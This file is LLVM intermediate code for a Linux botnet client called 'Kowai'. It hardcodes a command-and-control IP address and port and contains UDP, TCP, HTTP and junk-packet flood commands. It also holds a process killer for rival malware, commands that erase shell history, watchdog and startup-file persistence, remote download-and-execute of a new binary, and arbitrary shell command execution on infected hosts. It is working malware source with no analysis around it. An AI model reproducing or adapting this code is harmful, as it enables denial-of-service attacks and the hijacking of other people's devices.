; ModuleID = 'host/ir_sub/Kowai.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.__sigset_t = type { [16 x i64] }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.timeval = type { i64, i64 }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon.0 }
%union.anon.0 = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.tcp_pseudo = type { i64, i64, i8, i8, i16 }
%struct.state_t = type { i32, i8 }
%struct.udphdr = type { %union.anon.3 }
%union.anon.3 = type { %struct.anon.4 }
%struct.anon.4 = type { i16, i16, i16, i16 }
%struct.anon.1 = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.killerinfo = type { i8* }
%struct.__dirstream = type opaque
%struct.ifreq = type { %union.anon.6, %union.anon.7 }
%union.anon.6 = type { [16 x i8] }
%union.anon.7 = type { %struct.ifmap }
%struct.ifmap = type { i64, i64, i16, i8, i8, i8 }
%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, i8*, i8*, i8*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type { %struct._IO_marker*, %struct._IO_FILE*, i32 }

@cncip = global i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str, i32 0, i32 0), align 8
@.str = private unnamed_addr constant [16 x i8] c"178.128.154.119\00", align 1
@cncport = global i32 1994, align 4
@useragents = global [32 x i8*] [i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.1, i32 0, i32 0), i8* getelementptr inbounds ([116 x i8], [116 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([116 x i8], [116 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([136 x i8], [136 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([165 x i8], [165 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([116 x i8], [116 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([164 x i8], [164 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([152 x i8], [152 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([157 x i8], [157 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([157 x i8], [157 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([182 x i8], [182 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.24, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([106 x i8], [106 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([87 x i8], [87 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.31, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.32, i32 0, i32 0)], align 16
@.str.1 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.86 Safari/537.36\00", align 1
@.str.2 = private unnamed_addr constant [116 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36\00", align 1
@.str.3 = private unnamed_addr constant [116 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Safari/604.1.38\00", align 1
@.str.4 = private unnamed_addr constant [136 x i8] c"Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53\00", align 1
@.str.5 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0\00", align 1
@.str.6 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (X11; CrOS x86_64 9592.96.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.114 Safari/537.36\00", align 1
@.str.7 = private unnamed_addr constant [165 x i8] c"Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-G930W8 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/5.4 Chrome/51.0.2704.106 Mobile Safari/537.36\00", align 1
@.str.8 = private unnamed_addr constant [116 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36\00", align 1
@.str.9 = private unnamed_addr constant [164 x i8] c"Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; Lumia 535) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Mobile Safari/537.36 Edge/14.14393\00", align 1
@.str.10 = private unnamed_addr constant [152 x i8] c"Mozilla/5.0 (Linux; Android 4.4.4; HTC Desire 620 Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36\00", align 1
@.str.11 = private unnamed_addr constant [110 x i8] c"Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Mobile/14D27\00", align 1
@.str.12 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36\00", align 1
@.str.13 = private unnamed_addr constant [157 x i8] c"Mozilla/5.0 (Linux; Android 5.0; HUAWEI GRA-L09 Build/HUAWEIGRA-L09) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36\00", align 1
@.str.14 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36\00", align 1
@.str.15 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36\00", align 1
@.str.16 = private unnamed_addr constant [157 x i8] c"Mozilla/5.0(iPad; U; CPU iPhone OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B314 Safari/531.21.10gin_lib.cc\00", align 1
@.str.17 = private unnamed_addr constant [82 x i8] c"Mozilla/5.0 Galeon/1.2.9 (X11; Linux i686; U;) Gecko/20021213 Debian/1.2.9-0.bunk\00", align 1
@.str.18 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41\00", align 1
@.str.19 = private unnamed_addr constant [63 x i8] c"Mozilla/5.0 (compatible; iCab 3.0.3; Macintosh; U; PPC Mac OS)\00", align 1
@.str.20 = private unnamed_addr constant [182 x i8] c"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0\00", align 1
@.str.21 = private unnamed_addr constant [83 x i8] c"Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9a8) Gecko/2007100620 GranParadiso/3.1\00", align 1
@.str.22 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)\00", align 1
@.str.23 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4\00", align 1
@.str.24 = private unnamed_addr constant [64 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201\00", align 1
@.str.25 = private unnamed_addr constant [69 x i8] c"Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911\00", align 1
@.str.26 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2\00", align 1
@.str.27 = private unnamed_addr constant [106 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)\00", align 1
@.str.28 = private unnamed_addr constant [87 x i8] c"Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285\00", align 1
@.str.29 = private unnamed_addr constant [80 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7\00", align 1
@.str.30 = private unnamed_addr constant [34 x i8] c"Mozilla/5.0 (PLAYSTATION 3; 3.55)\00", align 1
@.str.31 = private unnamed_addr constant [91 x i8] c"Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Thunderbird/38.2.0 Lightning/4.0.2\00", align 1
@.str.32 = private unnamed_addr constant [64 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5\00", align 1
@mainCommSock = global i32 0, align 4
@currentServer = global i32 -1, align 4
@gotIP = global i32 0, align 4
@rangechoice = global i32 1, align 4
@hacked = global i32 0, align 4
@numpids = global i64 0, align 8
@macAddress = global [6 x i8] zeroinitializer, align 1
@pids = common global i32* null, align 8
@ourIP = common global %struct.in_addr zeroinitializer, align 4
@pgid = common global i32 0, align 4
@scanPid = common global i32 0, align 4
@ourPublicIP = common global %struct.in_addr zeroinitializer, align 4
@Q = internal global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal global i32 4095, align 4
@c = internal global i32 362436, align 4
@.str.147 = private unnamed_addr constant [7 x i8] c"(null)\00", align 1
@fdopen_pids = internal global i32* null, align 8
@.str.33 = private unnamed_addr constant [8 x i8] c"/bin/sh\00", align 1
@.str.34 = private unnamed_addr constant [3 x i8] c"sh\00", align 1
@.str.35 = private unnamed_addr constant [3 x i8] c"-c\00", align 1
@hextable = internal constant [256 x i64] [i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 0, i64 1, i64 2, i64 3, i64 4, i64 5, i64 6, i64 7, i64 8, i64 9, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1], align 16
@.str.36 = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@sendSTD.randstrings = private unnamed_addr constant [36 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.37, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.38, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.39, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.40, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.41, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.44, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.45, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.46, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.47, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.49, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.50, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.51, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.52, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.53, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.55, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.56, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.57, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.59, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.60, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.61, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.64, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.66, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.67, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.68, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.69, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.70, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.71, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.72, i32 0, i32 0)], align 16
@.str.37 = private unnamed_addr constant [6 x i8] c"arfgG\00", align 1
@.str.38 = private unnamed_addr constant [9 x i8] c"HBiug655\00", align 1
@.str.39 = private unnamed_addr constant [13 x i8] c"KJYDFyljf754\00", align 1
@.str.40 = private unnamed_addr constant [20 x i8] c"LIKUGilkut769458905\00", align 1
@.str.41 = private unnamed_addr constant [17 x i8] c"JHFDSkgfc5747694\00", align 1
@.str.42 = private unnamed_addr constant [12 x i8] c"GJjyur67458\00", align 1
@.str.43 = private unnamed_addr constant [12 x i8] c"RYSDk747586\00", align 1
@.str.44 = private unnamed_addr constant [12 x i8] c"HKJGi5r8675\00", align 1
@.str.45 = private unnamed_addr constant [10 x i8] c"KHGK7985i\00", align 1
@.str.46 = private unnamed_addr constant [11 x i8] c"yuituiILYF\00", align 1
@.str.47 = private unnamed_addr constant [14 x i8] c"GKJDghfcjkgd4\00", align 1
@.str.48 = private unnamed_addr constant [12 x i8] c"uygtfgtrevf\00", align 1
@.str.49 = private unnamed_addr constant [13 x i8] c"tyeuhygbtfvg\00", align 1
@.str.50 = private unnamed_addr constant [9 x i8] c"ewqdcftr\00", align 1
@.str.51 = private unnamed_addr constant [16 x i8] c"trbazetghhnbrty\00", align 1
@.str.52 = private unnamed_addr constant [11 x i8] c"tbhrwsehbg\00", align 1
@.str.53 = private unnamed_addr constant [12 x i8] c"twehgbferhb\00", align 1
@.str.54 = private unnamed_addr constant [12 x i8] c"etrbhhgetrb\00", align 1
@.str.55 = private unnamed_addr constant [14 x i8] c"edfverthbyrtb\00", align 1
@.str.56 = private unnamed_addr constant [14 x i8] c"kmiujmnhnhfgn\00", align 1
@.str.57 = private unnamed_addr constant [14 x i8] c"zcdbvgdfsbgfd\00", align 1
@.str.58 = private unnamed_addr constant [10 x i8] c"gdfbtsdgb\00", align 1
@.str.59 = private unnamed_addr constant [14 x i8] c"ghdugffytsdyt\00", align 1
@.str.60 = private unnamed_addr constant [14 x i8] c"tgerthgwtrwry\00", align 1
@.str.61 = private unnamed_addr constant [12 x i8] c"yteytietyue\00", align 1
@.str.62 = private unnamed_addr constant [9 x i8] c"qsortEQS\00", align 1
@.str.63 = private unnamed_addr constant [16 x i8] c"8969876hjkghblk\00", align 1
@.str.64 = private unnamed_addr constant [4 x i8] c"std\00", align 1
@.str.65 = private unnamed_addr constant [4 x i8] c"dts\00", align 1
@.str.66 = private unnamed_addr constant [4 x i8] c"lsk\00", align 1
@.str.67 = private unnamed_addr constant [4 x i8] c"kek\00", align 1
@.str.68 = private unnamed_addr constant [6 x i8] c"smack\00", align 1
@.str.69 = private unnamed_addr constant [4 x i8] c"ily\00", align 1
@.str.70 = private unnamed_addr constant [4 x i8] c"tyf\00", align 1
@.str.71 = private unnamed_addr constant [4 x i8] c"pos\00", align 1
@.str.72 = private unnamed_addr constant [6 x i8] c"cunts\00", align 1
@.str.73 = private unnamed_addr constant [27 x i8] c"Failed opening raw socket.\00", align 1
@.str.74 = private unnamed_addr constant [33 x i8] c"Failed setting raw headers mode.\00", align 1
@.str.75 = private unnamed_addr constant [4 x i8] c"all\00", align 1
@.str.76 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.77 = private unnamed_addr constant [4 x i8] c"syn\00", align 1
@.str.78 = private unnamed_addr constant [4 x i8] c"rst\00", align 1
@.str.79 = private unnamed_addr constant [4 x i8] c"fin\00", align 1
@.str.80 = private unnamed_addr constant [4 x i8] c"ack\00", align 1
@.str.81 = private unnamed_addr constant [4 x i8] c"psh\00", align 1
@.str.82 = private unnamed_addr constant [18 x i8] c"Invalid flag \22%s\22\00", align 1
@.str.83 = private unnamed_addr constant [22 x i8] c"history -c;history -w\00", align 1
@.str.84 = private unnamed_addr constant [30 x i8] c"cd /root;rm -rf .bash_history\00", align 1
@sendHTTP.methods = private unnamed_addr constant [3 x i8*] [i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.85, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.86, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.87, i32 0, i32 0)], align 16
@sendHTTP.connections = private unnamed_addr constant [3 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.88, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.89, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.90, i32 0, i32 0)], align 16
@.str.91 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.92 = private unnamed_addr constant [20 x i8] c" / HTTP/1.1\0D\0AHost: \00", align 1
@.str.93 = private unnamed_addr constant [15 x i8] c"\0D\0AUser-Agent: \00", align 1
@.str.94 = private unnamed_addr constant [15 x i8] c"\0D\0AConnection: \00", align 1
@.str.95 = private unnamed_addr constant [5 x i8] c"\0D\0A\0D\0A\00", align 1
@.str.88 = private unnamed_addr constant [6 x i8] c"close\00", align 1
@.str.89 = private unnamed_addr constant [11 x i8] c"keep-alive\00", align 1
@.str.90 = private unnamed_addr constant [7 x i8] c"accept\00", align 1
@.str.85 = private unnamed_addr constant [4 x i8] c"GET\00", align 1
@.str.86 = private unnamed_addr constant [5 x i8] c"HEAD\00", align 1
@.str.87 = private unnamed_addr constant [5 x i8] c"POST\00", align 1
@.str.96 = private unnamed_addr constant [5 x i8] c"/tmp\00", align 1
@.str.97 = private unnamed_addr constant [6 x i8] c"/tmp/\00", align 1
@.str.98 = private unnamed_addr constant [9 x i8] c"/var/tmp\00", align 1
@.str.99 = private unnamed_addr constant [10 x i8] c"/var/tmp/\00", align 1
@.str.100 = private unnamed_addr constant [8 x i8] c"8UsA.sh\00", align 1
@.str.101 = private unnamed_addr constant [5 x i8] c"GET \00", align 1
@.str.102 = private unnamed_addr constant [14 x i8] c" HTTP/1.0\0D\0A\0D\0A\00", align 1
@.str.103 = private unnamed_addr constant [30 x i8] c"Successfully downloaded file\0A\00", align 1
@.str.104 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.105 = private unnamed_addr constant [12 x i8] c"slumpthegod\00", align 1
@.str.106 = private unnamed_addr constant [3 x i8] c"./\00", align 1
@.str.107 = private unnamed_addr constant [11 x i8] c" Kowai.old\00", align 1
@.str.108 = private unnamed_addr constant [20 x i8] c"EXECUTED NEW BINARY\00", align 1
@.str.109 = private unnamed_addr constant [6 x i8] c"PONG!\00", align 1
@.str.110 = private unnamed_addr constant [7 x i8] c"UPDATE\00", align 1
@.str.111 = private unnamed_addr constant [7 x i8] c"KILLER\00", align 1
@.str.112 = private unnamed_addr constant [4 x i8] c"OFF\00", align 1
@.str.113 = private unnamed_addr constant [15 x i8] c"KILLER STOPPED\00", align 1
@.str.114 = private unnamed_addr constant [3 x i8] c"ON\00", align 1
@.str.115 = private unnamed_addr constant [15 x i8] c"KILLER STARTED\00", align 1
@.str.116 = private unnamed_addr constant [12 x i8] c"GETPUBLICIP\00", align 1
@.str.117 = private unnamed_addr constant [17 x i8] c"My Public IP: %s\00", align 1
@.str.118 = private unnamed_addr constant [5 x i8] c"HOLD\00", align 1
@.str.119 = private unnamed_addr constant [5 x i8] c"JUNK\00", align 1
@.str.120 = private unnamed_addr constant [4 x i8] c"UDP\00", align 1
@.str.121 = private unnamed_addr constant [4 x i8] c"TCP\00", align 1
@.str.122 = private unnamed_addr constant [5 x i8] c"HTTP\00", align 1
@.str.123 = private unnamed_addr constant [4 x i8] c"CNC\00", align 1
@.str.124 = private unnamed_addr constant [4 x i8] c"STD\00", align 1
@.str.125 = private unnamed_addr constant [9 x i8] c"STOPATTK\00", align 1
@.str.126 = private unnamed_addr constant [11 x i8] c"Killed %d.\00", align 1
@.str.127 = private unnamed_addr constant [13 x i8] c"None Killed.\00", align 1
@.str.128 = private unnamed_addr constant [8 x i8] c"8.8.8.8\00", align 1
@.str.129 = private unnamed_addr constant [16 x i8] c"/proc/net/route\00", align 1
@.str.130 = private unnamed_addr constant [11 x i8] c"\0900000000\09\00", align 1
@.str.131 = private unnamed_addr constant [33 x i8] c"kowai ohhhh that sad kid slump??\00", align 1
@.str.132 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.133 = private unnamed_addr constant [14 x i8] c"/dev/watchdog\00", align 1
@.str.134 = private unnamed_addr constant [19 x i8] c"/dev/misc/watchdog\00", align 1
@.str.135 = private unnamed_addr constant [19 x i8] c"/etc/rc.d/rc.local\00", align 1
@.str.136 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.137 = private unnamed_addr constant [13 x i8] c"/etc/rc.conf\00", align 1
@.str.138 = private unnamed_addr constant [8 x i8] c"\22%s%s\22\0A\00", align 1
@.str.139 = private unnamed_addr constant [2 x i8] c"a\00", align 1
@.str.140 = private unnamed_addr constant [52 x i8] c"\1B[1;35mJoining\1B[1;32m > \1B[90m[\1B[1;33m%s\1B[90m]  \1B[0m\00", align 1
@.str.141 = private unnamed_addr constant [9 x i8] c"kowai V1\00", align 1
@.str.142 = private unnamed_addr constant [5 x i8] c"PONG\00", align 1
@.str.143 = private unnamed_addr constant [4 x i8] c"CMD\00", align 1
@.str.144 = private unnamed_addr constant [8 x i8] c"%s 2>&1\00", align 1
@.str.145 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@.str.146 = private unnamed_addr constant [2 x i8] c" \00", align 1

; Function Attrs: noinline nounwind uwtable
define void @init_rand(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* %2, align 4
  store i32 %4, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %5 = load i32, i32* %2, align 4
  %6 = sub i32 %5, -1013282246
  %7 = add i32 %6, -1640531527
  %8 = add i32 %7, -1013282246
  %9 = add i32 %5, -1640531527
  store i32 %8, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %10 = load i32, i32* %2, align 4
  %11 = add i32 %10, 903914515
  %12 = add i32 %11, -1640531527
  %13 = sub i32 %12, 903914515
  %14 = add i32 %10, -1640531527
  %15 = sub i32 %13, 1457027844
  %16 = add i32 %15, -1640531527
  %17 = add i32 %16, 1457027844
  %18 = add i32 %13, -1640531527
  store i32 %17, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  store i32 3, i32* %3, align 4
  br label %19

; <label>:19:                                     ; preds = %65, %1
  %20 = load i32, i32* %3, align 4
  %21 = icmp slt i32 %20, 4096
  br i1 %21, label %22, label %72

; <label>:22:                                     ; preds = %19
  %23 = load i32, i32* %3, align 4
  %24 = sub i32 0, 3
  %25 = add i32 %23, %24
  %26 = sub nsw i32 %23, 3
  %27 = sext i32 %25 to i64
  %28 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %27
  %29 = load i32, i32* %28, align 4
  %30 = load i32, i32* %3, align 4
  %31 = add i32 %30, -612130854
  %32 = sub i32 %31, 2
  %33 = sub i32 %32, -612130854
  %34 = sub nsw i32 %30, 2
  %35 = sext i32 %33 to i64
